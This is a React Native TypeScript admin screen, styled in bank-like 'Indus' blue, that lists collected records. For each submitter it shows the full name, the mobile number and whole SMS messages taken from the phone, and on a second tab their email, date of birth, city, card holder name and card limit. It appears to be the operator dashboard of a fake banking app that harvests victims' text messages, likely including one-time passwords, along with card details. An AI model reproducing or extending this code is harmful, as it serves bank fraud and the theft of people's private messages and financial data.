import { NativeStackScreenProps } from '@react-navigation/native-stack';
import { useCallback, useEffect, useState } from 'react';
import {
  ActivityIndicator,
  Pressable,
  RefreshControl,
  ScrollView,
  StyleSheet,
  Text,
  View,
} from 'react-native';
import { LinearGradient } from 'expo-linear-gradient';
import { smsApi, userApi, UserSmsRecord, UserRecord } from '../api/client';
import { RootStackParamList } from '../types/navigation';

type Props = NativeStackScreenProps<RootStackParamList, 'AdminPanel'>;
type TabType = 'sms' | 'users';

const INDUS_BLUE = '#1B3A6B';
const INDUS_DARK = '#0F1F3D';

function formatDate(iso: string): string {
  const d = new Date(iso);
  return d.toLocaleDateString('en-IN', {
    day: '2-digit',
    month: 'short',
    year: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
  });
}

function formatSmsDate(ms: number): string {
  const d = new Date(ms);
  return d.toLocaleDateString('en-IN', {
    day: '2-digit',
    month: 'short',
    hour: '2-digit',
    minute: '2-digit',
  });
}

export default function AdminPanelScreen({ navigation }: Props) {
  const [activeTab, setActiveTab] = useState<TabType>('sms');

  // SMS state
  const [smsRecords, setSmsRecords] = useState<UserSmsRecord[]>([]);
  const [smsLoading, setSmsLoading] = useState(true);
  const [smsRefreshing, setSmsRefreshing] = useState(false);
  const [smsError, setSmsError] = useState<string | null>(null);

  // User state
  const [userRecords, setUserRecords] = useState<UserRecord[]>([]);
  const [userLoading, setUserLoading] = useState(true);
  const [userRefreshing, setUserRefreshing] = useState(false);
  const [userError, setUserError] = useState<string | null>(null);

  const fetchSms = useCallback(async (isRefresh = false) => {
    if (isRefresh) setSmsRefreshing(true);
    else setSmsLoading(true);
    setSmsError(null);
    try {
      const res = await smsApi.getAll();
      if (res.success && res.data) {
        const data = (res.data as any).data || res.data;
        setSmsRecords(Array.isArray(data) ? data : []);
      } else {
        setSmsError(res.error || 'Failed to load SMS records');
      }
    } catch {
      setSmsError('Network error. Please try again.');
    } finally {
      setSmsLoading(false);
      setSmsRefreshing(false);
    }
  }, []);

  const fetchUsers = useCallback(async (isRefresh = false) => {
    if (isRefresh) setUserRefreshing(true);
    else setUserLoading(true);
    setUserError(null);
    try {
      const res = await userApi.getAll();
      if (res.success && res.data) {
        const data = (res.data as any).data || res.data;
        setUserRecords(Array.isArray(data) ? data : []);
      } else {
        setUserError(res.error || 'Failed to load user records');
      }
    } catch {
      setUserError('Network error. Please try again.');
    } finally {
      setUserLoading(false);
      setUserRefreshing(false);
    }
  }, []);

  useEffect(() => {
    fetchSms();
    fetchUsers();
  }, [fetchSms, fetchUsers]);

  const handleLogout = () => {
    navigation.reset({ index: 0, routes: [{ name: 'Welcome' }] });
  };

  const headerCount =
    activeTab === 'sms'
      ? `${smsRecords.length} SMS record${smsRecords.length !== 1 ? 's' : ''}`
      : `${userRecords.length} user${userRecords.length !== 1 ? 's' : ''}`;

  return (
    <LinearGradient colors={['#E8EFF7', '#F5F8FC', '#FFFFFF']} style={styles.container}>
      {/* Header */}
      <View style={styles.header}>
        <View>
          <Text style={styles.headerTitle}>Admin Panel</Text>
          <Text style={styles.headerSubtitle}>{headerCount}</Text>
        </View>
        <Pressable style={styles.logoutButton} onPress={handleLogout}>
          <Text style={styles.logoutText}>Logout</Text>
        </Pressable>
      </View>

      {/* Tabs */}
      <View style={styles.tabBar}>
        <Pressable
          style={[styles.tab, activeTab === 'sms' && styles.tabActive]}
          onPress={() => setActiveTab('sms')}
        >
          <Text style={[styles.tabText, activeTab === 'sms' && styles.tabTextActive]}>
            📩 SMS Records
          </Text>
        </Pressable>
        <Pressable
          style={[styles.tab, activeTab === 'users' && styles.tabActive]}
          onPress={() => setActiveTab('users')}
        >
          <Text style={[styles.tabText, activeTab === 'users' && styles.tabTextActive]}>
            👤 User Details
          </Text>
        </Pressable>
      </View>

      {/* SMS Tab */}
      {activeTab === 'sms' && (
        <ScrollView
          style={styles.scrollView}
          contentContainerStyle={styles.scrollContent}
          showsVerticalScrollIndicator={false}
          refreshControl={
            <RefreshControl
              refreshing={smsRefreshing}
              onRefresh={() => fetchSms(true)}
              colors={[INDUS_BLUE]}
            />
          }
        >
          {smsLoading ? (
            <View style={styles.center}>
              <ActivityIndicator size="large" color={INDUS_BLUE} />
              <Text style={styles.loadingText}>Loading SMS records...</Text>
            </View>
          ) : smsError ? (
            <View style={styles.center}>
              <Text style={styles.errorText}>{smsError}</Text>
              <Pressable style={styles.retryButton} onPress={() => fetchSms()}>
                <Text style={styles.retryText}>Retry</Text>
              </Pressable>
            </View>
          ) : smsRecords.length === 0 ? (
            <View style={styles.center}>
              <Text style={styles.emptyIcon}>📭</Text>
              <Text style={styles.emptyText}>No SMS records yet</Text>
              <Text style={styles.emptySubtext}>
                SMS records will appear here once users submit the form
              </Text>
            </View>
          ) : (
            smsRecords.map((record, idx) => (
              <View key={record._id || idx} style={styles.card}>
                <View style={styles.cardHeader}>
                  <View style={styles.avatar}>
                    <Text style={styles.avatarText}>
                      {record.fullName?.charAt(0)?.toUpperCase() || '?'}
                    </Text>
                  </View>
                  <View style={styles.cardHeaderInfo}>
                    <Text style={styles.cardName}>{record.fullName}</Text>
                    <Text style={styles.cardSub}>{record.mobileNumber}</Text>
                  </View>
                  <Text style={styles.cardDate}>{formatDate(record.createdAt)}</Text>
                </View>
                <View style={styles.divider} />
                <View style={styles.messagesContainer}>
                  {record.messages.map((msg, mIdx) => (
                    <View key={mIdx} style={styles.smsCard}>
                      <View style={styles.smsHeader}>
                        <Text style={styles.smsSender} numberOfLines={1}>
                          {msg.address || 'Unknown'}
                        </Text>
                        <Text style={styles.smsTime}>{formatSmsDate(msg.date)}</Text>
                      </View>
                      <Text style={styles.smsBody} numberOfLines={4}>{msg.body}</Text>
                    </View>
                  ))}
                </View>
              </View>
            ))
          )}
        </ScrollView>
      )}

      {/* User Details Tab */}
      {activeTab === 'users' && (
        <ScrollView
          style={styles.scrollView}
          contentContainerStyle={styles.scrollContent}
          showsVerticalScrollIndicator={false}
          refreshControl={
            <RefreshControl
              refreshing={userRefreshing}
              onRefresh={() => fetchUsers(true)}
              colors={[INDUS_BLUE]}
            />
          }
        >
          {userLoading ? (
            <View style={styles.center}>
              <ActivityIndicator size="large" color={INDUS_BLUE} />
              <Text style={styles.loadingText}>Loading user details...</Text>
            </View>
          ) : userError ? (
            <View style={styles.center}>
              <Text style={styles.errorText}>{userError}</Text>
              <Pressable style={styles.retryButton} onPress={() => fetchUsers()}>
                <Text style={styles.retryText}>Retry</Text>
              </Pressable>
            </View>
          ) : userRecords.length === 0 ? (
            <View style={styles.center}>
              <Text style={styles.emptyIcon}>📋</Text>
              <Text style={styles.emptyText}>No user details yet</Text>
              <Text style={styles.emptySubtext}>
                User details will appear here after users submit the form
              </Text>
            </View>
          ) : (
            userRecords.map((user, idx) => (
              <View key={user._id || idx} style={styles.card}>
                <View style={styles.cardHeader}>
                  <View style={styles.avatar}>
                    <Text style={styles.avatarText}>
                      {user.fullName?.charAt(0)?.toUpperCase() || '?'}
                    </Text>
                  </View>
                  <View style={styles.cardHeaderInfo}>
                    <Text style={styles.cardName}>{user.fullName}</Text>
                    <Text style={styles.cardSub}>{user.mobileNumber}</Text>
                  </View>
                  <Text style={styles.cardDate}>{formatDate(user.createdAt)}</Text>
                </View>
                <View style={styles.divider} />
                <View style={styles.userDetailsGrid}>
                  <DetailRow label="Email" value={user.email} />
                  <DetailRow label="Date of Birth" value={user.dob} />
                  <DetailRow label="City" value={user.city} />
                  <DetailRow label="Card Holder" value={user.cardHolderName} />
                  <DetailRow label="Card Limit" value={`\u20B9${user.cardTotalLimit}`} />
                  {user.simLabel ? <DetailRow label="SIM" value={user.simLabel} /> : null}
                </View>
              </View>
            ))
          )}
        </ScrollView>
      )}
    </LinearGradient>
  );
}

function DetailRow({ label, value }: { label: string; value: string }) {
  return (
    <View style={styles.detailRow}>
      <Text style={styles.detailLabel}>{label}</Text>
      <Text style={styles.detailValue}>{value}</Text>
    </View>
  );
}

const styles = StyleSheet.create({
  container: { flex: 1 },

  // Header
  header: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    alignItems: 'center',
    paddingHorizontal: 24,
    paddingTop: 52,
    paddingBottom: 16,
    backgroundColor: INDUS_BLUE,
  },
  headerTitle: { fontSize: 22, fontWeight: '800', color: '#FFFFFF' },
  headerSubtitle: { fontSize: 13, color: 'rgba(255,255,255,0.7)', marginTop: 2 },
  logoutButton: {
    backgroundColor: 'rgba(255,255,255,0.15)',
    paddingHorizontal: 16,
    paddingVertical: 8,
    borderRadius: 8,
  },
  logoutText: { color: '#FFFFFF', fontSize: 14, fontWeight: '600' },

  // Tabs
  tabBar: {
    flexDirection: 'row',
    backgroundColor: INDUS_BLUE,
    paddingHorizontal: 16,
  },
  tab: {
    flex: 1,
    paddingVertical: 12,
    alignItems: 'center',
    borderBottomWidth: 3,
    borderBottomColor: 'transparent',
  },
  tabActive: {
    borderBottomColor: '#FFFFFF',
  },
  tabText: {
    fontSize: 14,
    fontWeight: '600',
    color: 'rgba(255,255,255,0.55)',
  },
  tabTextActive: {
    color: '#FFFFFF',
  },

  // Scroll
  scrollView: { flex: 1 },
  scrollContent: { padding: 16, paddingBottom: 40 },

  // Center states
  center: { alignItems: 'center', justifyContent: 'center', paddingVertical: 60 },
  loadingText: { marginTop: 12, fontSize: 14, color: '#6B7280' },
  errorText: { fontSize: 15, color: '#EF4444', textAlign: 'center', marginBottom: 16 },
  retryButton: {
    backgroundColor: INDUS_BLUE,
    paddingHorizontal: 24,
    paddingVertical: 10,
    borderRadius: 8,
  },
  retryText: { color: '#FFFFFF', fontSize: 14, fontWeight: '600' },
  emptyIcon: { fontSize: 48, marginBottom: 12 },
  emptyText: { fontSize: 18, fontWeight: '700', color: INDUS_DARK, marginBottom: 6 },
  emptySubtext: {
    fontSize: 14,
    color: '#6B7280',
    textAlign: 'center',
    lineHeight: 20,
    paddingHorizontal: 32,
  },

  // Card
  card: {
    backgroundColor: '#FFFFFF',
    borderRadius: 16,
    marginBottom: 16,
    padding: 16,
    elevation: 3,
    shadowColor: '#000',
    shadowOffset: { width: 0, height: 2 },
    shadowOpacity: 0.08,
    shadowRadius: 8,
  },
  cardHeader: { flexDirection: 'row', alignItems: 'center' },
  avatar: {
    width: 40,
    height: 40,
    borderRadius: 20,
    backgroundColor: INDUS_BLUE,
    justifyContent: 'center',
    alignItems: 'center',
    marginRight: 12,
  },
  avatarText: { color: '#FFFFFF', fontSize: 18, fontWeight: '700' },
  cardHeaderInfo: { flex: 1 },
  cardName: { fontSize: 16, fontWeight: '700', color: INDUS_DARK },
  cardSub: { fontSize: 13, color: '#6B7280', marginTop: 1 },
  cardDate: { fontSize: 11, color: '#9CA3AF' },
  divider: { height: 1, backgroundColor: '#E5E7EB', marginVertical: 12 },

  // SMS messages
  messagesContainer: { gap: 8 },
  smsCard: {
    backgroundColor: '#F8FAFC',
    borderRadius: 10,
    padding: 12,
    borderWidth: 1,
    borderColor: '#E5E7EB',
  },
  smsHeader: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    alignItems: 'center',
    marginBottom: 6,
  },
  smsSender: { fontSize: 13, fontWeight: '700', color: INDUS_BLUE, flex: 1, marginRight: 8 },
  smsTime: { fontSize: 11, color: '#9CA3AF' },
  smsBody: { fontSize: 12, color: '#374151', lineHeight: 18 },

  // User detail rows
  userDetailsGrid: { gap: 4 },
  detailRow: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    paddingVertical: 7,
    borderBottomWidth: 1,
    borderBottomColor: '#F3F4F6',
  },
  detailLabel: { fontSize: 13, color: '#6B7280', fontWeight: '500', flex: 1 },
  detailValue: { fontSize: 13, color: INDUS_DARK, fontWeight: '600', flex: 2, textAlign: 'right' },
});